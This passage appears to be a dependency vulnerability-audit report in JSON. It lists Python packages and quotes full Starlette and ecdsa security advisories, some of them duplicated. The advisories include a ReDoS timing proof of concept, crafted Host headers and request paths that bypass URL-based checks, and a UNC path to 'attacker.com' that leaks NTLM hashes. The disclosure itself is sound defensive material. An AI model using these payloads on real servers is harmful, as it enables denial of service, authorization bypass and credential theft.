"vulns": []}, {"name": "realtime", "version": "2.4.3", "vulns": []}, {"name": "aiohttp", "version": "3.14.5", "vulns": []}, {"name": "multidict", "version": "7.2.1", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "starlette", "version": "0.46.2", "vulns": [{"id": "PYSEC-2026-1941", "fix_versions": ["0.47.2"], "aliases": ["CVE-2025-54121", "GHSA-2c2j-9gv5-cj73"], "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."}, {"id": "PYSEC-2026-1942", "fix_versions": ["0.49.1"], "aliases": ["GHSA-7f5h-v6xp-fcq8", "CVE-2025-62727"], "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header."}, {"id": "PYSEC-2026-161", "fix_versions": ["1.0.1"], "aliases": ["GHSA-86qp-5c8j-p5mr", "CVE-2026-48710", "X41-2026-002"], "description": "Starlette reconstructs the requested URL based on the HTTP Host request header and requested path, but does not perform any validation of the Host header value. This allows attackers to inject paths into the host part, prepending the actual path. However, routing in Starlette is based on the actual request path. This inconsistent interpretation of HTTP requests may lead to issues such as authentication bypass when the authentication depends on the reconstructed URL\u2019s path."}, {"id": "PYSEC-2026-161", "fix_versions": ["1.0.1"], "aliases": ["CVE-2026-48710", "GHSA-86qp-5c8j-p5mr", "X41-2026-002"], "description": "### Summary In affected versions, the HTTP `Host` request header was not validated before being used to reconstruct `request.url`. Because the routing algorithm relies on the raw HTTP path while `request.url` is rebuilt from the `Host` header, a malformed header could make `request.url.path` differ from the path that was actually requested. Middleware and endpoints that apply security restrictions based on `request.url` (rather than the raw `scope` path) could therefore be bypassed.  ### Details When a client requests `http://example.com/foo`, it sends:  ```http GET /foo HTTP/1.1 Host: example.com ```  Affected versions reconstructed the URL by concatenating `http://{host}{path}` and re-parsing the result. The `Host` value is only valid as a `uri-host [ \":\" port ]` per [RFC 9112 \u00a73.2](https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2-6), where `uri-host` follows the restricted `host` grammar of [RFC 3986 \u00a73.2.2](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.2). When it contains characters outside that grammar - notably `/`, `?`, or `#` - those characters move the path/query/fragment boundaries during re-parsing, so the parsed `request.url.path` no longer matches the path the server actually received. For example:  ```http GET /foo HTTP/1.1 Host: example.com/abc?bar= ```  reconstructs to `http://example.com/abc?bar=/foo`, whose parsed `path` is `/abc` - even though routing used the real path `/foo`. The router still dispatches to `/foo` and the endpoint executes, but any middleware or code that reads `request.url.path` sees `/abc`, so path-based authorization checks can be bypassed.  ### Impact Any application running an affected version that relies on `request.url` (or `request.url.path`) for security-sensitive decisions is affected. The most common case is middleware that gates access to certain path prefixes based on `request.url.path`. Deployments fronted by a proxy or load balancer are mitigated only if that proxy rejects or normalizes the malformed `Host` header before forwarding and the application does not trust attacker-controlled host headers (e.g. `X-Forwarded-Host`) elsewhere.  ### Mitigation Upgrade to a patched version, which validates the `Host` header against the grammar of [RFC 9112 \u00a73.2](https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2-6) / [RFC 3986 \u00a73.2.2](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.2) when constructing `request.url` and falls back to `scope[\"server\"]` for malformed values."}, {"id": "PYSEC-2026-2281", "fix_versions": ["1.1.0"], "aliases": ["GHSA-wqp7-x3pw-xc5r", "CVE-2026-48818"], "description": "### Summary  When serving static files on Windows, `StaticFiles` resolves the requested path with [`os.path.realpath`](https://docs.python.org/3/library/os.path.html#os.path.realpath). If a UNC path (such as `\\\\attacker.com\\share`) reaches the resolver, `realpath` causes the process to open a connection to the remote host over SMB (port 445). This is a server-side request forgery (SSRF) that leaks the service account's NTLMv2 credentials to the attacker-controlled host, which can then be cracked offline or relayed to other hosts.  ### Details  `StaticFiles.lookup_path()` joins the requested path onto the served directory and calls [`os.path.realpath`](https://docs.python.org/3/library/os.path.html#os.path.realpath) on the result before checking containment with [`os.path.commonpath`](https://docs.python.org/3/library/os.path.html#os.path.commonpath). On Windows, a UNC path is absolute, so [`os.path.join`](https://docs.python.org/3/library/os.path.html#os.path.join) discards the served directory and `realpath` resolves the bare UNC path, triggering the outbound SMB connection and NTLM authentication before the containment check rejects the path. The HTTP response is a benign 404, but the credential disclosure has already happened. POSIX systems are not affected.  This only affects the default configuration (`follow_symlink=False`), which uses [`os.path.realpath`](https://docs.python.org/3/library/os.path.html#os.path.realpath). The `follow_symlink=True` branch uses [`os.path.abspath`](https://docs.python.org/3/library/os.path.html#os.path.abspath), which performs no I/O.  ### Impact  Applications running on Windows that serve files with `StaticFiles` (directly, or via a framework built on Starlette such as FastAPI) in the default configuration are affected. `StaticFiles` is typically unauthenticated, so any client can trigger the SMB connection and leak the service account's NTLMv2 hash. A secondary impact is discovering internal hosts reachable over SMB by timing responses for valid versus invalid addresses.  ### Mitigation  Applications not running on Windows are not affected. On Windows, serving static files through a dedicated web server (such as nginx or IIS) instead of `StaticFiles` avoids the issue. Blocking outbound SMB (port 445) from the application host prevents the credential disclosure even if a UNC path is resolved."}, {"id": "PYSEC-2026-2280", "fix_versions": ["1.1.0"], "aliases": ["CVE-2026-48817", "GHSA-x746-7m8f-x49c"], "description": "### Summary  When dispatching a request, `HTTPEndpoint` selects the handler by lowercasing the HTTP method and looking it up as an attribute with `getattr`, without restricting the lookup to a known set of HTTP verbs.  When an `HTTPEndpoint` subclass is registered through `Route(...)` without an explicit `methods=` argument, the route does not constrain the method and every method reaches the endpoint. If a non-standard HTTP method whose lowercased name matches an attribute on the endpoint subclass reaches the endpoint, that attribute is invoked as if it were a request handler. An attacker can use this to reach methods that were never meant to be HTTP handlers, such as internal helpers, without the authorization checks applied by the intended public handler.  ### Details  `HTTPEndpoint` uses the client-supplied method name to resolve an instance attribute, without validating it against the set of HTTP verbs the endpoint supports. A method such as `_DO_DELETE` therefore resolves an attribute like `_do_delete` and invokes it. Non-standard methods are valid [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110#name-method) token methods, so an endpoint must not treat the method name as a trusted attribute selector.  ### Impact  An application is affected when all of the following hold:  * It defines an `HTTPEndpoint` subclass and registers it via `Route(...)` without an explicit `methods=` argument. * The subclass defines additional methods whose names match a non-standard HTTP-method token shape and that accept a single `request` argument and return a response.  This also affects frameworks built on Starlette, like FastAPI.  ### Mitigation  Register `HTTPEndpoint` subclasses with an explicit `methods=` argument on the `Route`, listing only the HTTP verbs the endpoint supports. The route then rejects any other method with `405 Method Not Allowed` before it reaches the endpoint, so non-standard methods cannot resolve an attribute."}, {"id": "PYSEC-2026-249", "fix_versions": ["1.3.1"], "aliases": ["CVE-2026-54283", "GHSA-82w8-qh3p-5jfq"], "description": "### Summary `request.form()` accepts `max_fields` and `max_part_size` to bound resource consumption while parsing form data. These limits are enforced for `multipart/form-data`, but silently ignored for `application/x-www-form-urlencoded`. An unauthenticated attacker can therefore send a urlencoded body with an arbitrarily large number of fields or an arbitrarily large field, even when the application configured limits it believed would apply.  ### Details `request.form()` dispatches to a different parser depending on the `Content-Type`. For `multipart/form-data` the `max_files`, `max_fields`, and `max_part_size` limits are forwarded to the parser, but for `application/x-www-form-urlencoded` the parser is constructed without them. It has no `max_fields` or `max_part_size` parameter to receive them, and it appends every field with no count check and accumulates each field's name and value with no size check. The configured limits are therefore both unreachable and unenforced for url-encoded bodies.  Because the url-encoded parser does its work synchronously between stream reads, the two attack shapes have different effects:  - **Field count** drives CPU and event-loop blocking. A body of ~1,000,000 fields (a sub-10MB payload such as `f0=v&f1=v&...`) blocks the worker's event loop for several seconds while parsing, during which the worker serves no other request. - **Field size** drives memory. A single large field value (e.g. a 50MB value) is buffered in full to build the `FormData`, forcing memory allocation proportional to the request body.  The equivalent `multipart/form-data` request is correctly rejected with `400 Too many fields` / `400 Field exceeded maximum size`.  ### Impact This Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) that call `request.form()` on `application/x-www-form-urlencoded` requests. A single request with a very large number of fields blocks the event loop for several seconds, and a single request with a very large field forces unbounded memory allocation; in either case, parallel requests can render the service unusable. A reverse proxy that enforces a request body size limit reduces but does not eliminate the exposure, since a sub-10MB body is already enough to block the event loop.  ### Mitigation Upgrade to a patched version, which forwards `max_fields` and `max_part_size` to the url-encoded parser and enforces them while parsing, raising before the oversized field or excess fields are accumulated. The defaults match `multipart/form-data` (`max_fields=1000`, `max_part_size=1MB`) and can be customized via `request.form(max_fields=..., max_part_size=...)`."}, {"id": "PYSEC-2026-248", "fix_versions": ["1.3.0"], "aliases": ["CVE-2026-54282", "GHSA-jp82-jpqv-5vv3"], "description": "### Summary  In affected versions, the HTTP request path is not validated before being used to reconstruct `request.url`. Because `request.url` is rebuilt by concatenating `{scheme}://{host}{path}` and re-parsing the result, a path that does not begin with `/` (for example `@google.com`) moves the authority boundary during re-parsing, so `request.url.hostname` and `request.url.netloc` become attacker-controlled. Code that reads `request.url.hostname` (rather than the `Host` header or `scope`) can therefore be misled into trusting an attacker-supplied host.  ### Details  When a client requests a path that does not start with `/`:  ```http GET @google.com HTTP/1.1 Host: localhost ```  affected versions reconstruct the URL as `http://localhost@google.com`. Per [RFC 3986 \u00a73.2.1](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.1), the substring before `@` in the authority is `userinfo`, so re-parsing yields `username = \"localhost\"` and `hostname = \"google.com\"`, with an empty path:  ```text request.url          == \"http://localhost@google.com\" request.url.hostname == \"google.com\" request.url.path     == \"\" ```  The root cause is that the path is concatenated directly after the host without a separating `/`, and without validating that it begins with one. Only the `Host` header was validated when constructing `request.url`; the path was not.  This requires an ASGI server that forwards a request-target lacking a leading `/` into `scope[\"path\"]`.  ### Impact  Any application running an affected version that uses `request.url`, `request.url.netloc`, or `request.url.hostname` for a security-sensitive decision (host-based authorization, redirect/callback base, SSRF target, cache key, audit log) may be affected, when no fronting proxy or load balancer rejects the malformed request-target first.  Note that this is less exploitable than [GHSA-86qp-5c8j-p5mr](https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr): there, the poison is carried in the `Host` header, so the real path still routes to a valid endpoint while `request.url.path` lies. Here, the poison must be carried in the path itself, and that path (`@google.com`) does not match any registered route, so routing returns `404` and no endpoint handler runs. The exposure is limited to code that reads `request.url` before routing - notably middleware - or in 404/exception handlers.  ### Mitigation  Upgrade to a patched version, which prevents the request path from crossing into the URL authority. The request above instead yields `http://localhost/@google.com` with `request.url.hostname == \"localhost\"`."}, {"id": "PYSEC-2026-249", "fix_versions": ["1.3.1"], "aliases": ["CVE-2026-54283", "GHSA-82w8-qh3p-5jfq"], "description": "Starlette is a lightweight ASGI framework/toolkit. From 0.4.1 until 1.3.1, request.form() accepts max_fields and max_part_size to bound resource consumption while parsing form data. These limits are enforced for multipart/form-data, but silently ignored for application/x-www-form-urlencoded. An unauthenticated attacker can therefore send a urlencoded body with an arbitrarily large number of fields or an arbitrarily large field, even when the application configured limits it believed would apply. This vulnerability is fixed in 1.3.1."}, {"id": "PYSEC-2026-248", "fix_versions": ["1.3.0"], "aliases": ["CVE-2026-54282", "GHSA-jp82-jpqv-5vv3"], "description": "Starlette is a lightweight ASGI framework/toolkit. Prior to 1.3.0, the HTTP request path is not validated before being used to reconstruct request.url. Because request.url is rebuilt by concatenating {scheme}://{host}{path} and re-parsing the result, a path that does not begin with / (for example @google.com) moves the authority boundary during re-parsing, so request.url.hostname and request.url.netloc become attacker-controlled. Code that reads request.url.hostname (rather than the Host header or scope) can therefore be misled into trusting an attacker-supplied host. This vulnerability is fixed in 1.3.0."}, {"id": "PYSEC-2026-1942", "fix_versions": ["0.49.1"], "aliases": ["GHSA-7f5h-v6xp-fcq8", "CVE-2025-62727"], "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header."}, {"id": "PYSEC-2026-1941", "fix_versions": ["0.47.2"], "aliases": ["CVE-2025-54121", "GHSA-2c2j-9gv5-cj73"], "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."}, {"id": "PYSEC-2026-2281", "fix_versions": ["1.1.0"], "aliases": ["GHSA-wqp7-x3pw-xc5r", "CVE-2026-48818"], "description": "Starlette is a lightweight ASGI framework/toolkit. In versions 1.0.1 and earlier, StaticFiles on Windows is vulnerable to SSRF. An UNC path such as \\\\attacker.com\\share can cause os.path.realpath to initiate an outbound SMB connection before the path is rejected, exposing the service account\u2019s NTLMv2 credentials for offline cracking or relay even though the HTTP response is only a 404. The issue affects default follow_symlink=False deployments, including frameworks built on Starlette such as FastAPI; POSIX systems and follow_symlink=True are unaffected. The issue is fixed in 1.1.0."}, {"id": "PYSEC-2026-2280", "fix_versions": ["1.1.0"], "aliases": ["CVE-2026-48817", "GHSA-x746-7m8f-x49c"], "description": "Starlette is a lightweight ASGI framework/toolkit. In versions 1.0.1 and below, when dispatching a request, HTTPEndpoint selects the handler by lowercasing the HTTP method and looking it up as an attribute with getattr, without restricting the lookup to a known set of HTTP verbs. When an HTTPEndpoint subclass is registered through Route(...) without an explicit methods= argument, the route does not constrain the method and every method reaches the endpoint. If a non-standard HTTP method whose lowercased name matches an attribute on the endpoint subclass reaches the endpoint, that attribute is invoked as if it were a request handler. An attacker can use this to reach methods that were never meant to be HTTP handlers, such as internal helpers, without the authorization checks applied by the intended public handler. An application (including Starlette-based frameworks like FastAPI) is affected if it registers an HTTPEndpoint subclass via Route(...) without explicitly setting methods=, and that subclass includes extra methods named like non-standard HTTP verbs that take one request argument and return a response. This issue has been fixed in version 1.1.0."}]}, {"name": "anyio", "version": "4.16.0", "vulns": []}, {"name": "storage3", "version": "0.11.3", "vulns": []}, {"name": "supafunc", "version": "0.9.4", "vulns": []}, {"name": "strenum", "version": "0.4.15", "vulns": []}, {"name": "typing-extensions", "version": "4.16.0", "vulns": []}, {"name": "websockets", "version": "14.2", "vulns": []}, {"name": "yarl", "version": "1.25.1", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.7.1", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "annotated-types", "version": "0.8.0", "vulns": []}, {"name": "attrs", "version": "26.1.0", "vulns": []}, {"name": "click", "version": "8.5.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "cryptography", "version": "50.0.2", "vulns": []}, {"name": "cffi", "version": "2.1.1", "vulns": []}, {"name": "dnspython", "version": "2.9.1", "vulns": []}, {"name": "ecdsa", "version": "0.19.2", "vulns": [{"id": "PYSEC-2026-1325", "fix_versions": [], "aliases": ["CVE-2024-23342", "GHSA-wj6h-64fc-37mp"], "description": "python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."}, {"id": "PYSEC-2026-1325", "fix_versions": [], "aliases": ["CVE-2024-23342", "GHSA-wj6h-64fc-37mp"], "description": "python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."}]}, {"name": "frozenlist", "version": "1.8.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "httptools", "version": "0.9.0", "vulns": []}, {"name": "idna", "version": "3.20", "vulns": []}, {"name": "propcache", "version": "0.5.4", "vulns": []}, {"name": "python-dotenv", "version": "1.2.4", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.4", "vulns": []}, {"name": "watchfiles", "version": "1.3.0", "vulns": []}, {"name": "certifi", "version": "2026.10.23", "vulns": []}, {"name": "pycparser", "version": "3.12", "vulns": []}], "fixes": []}
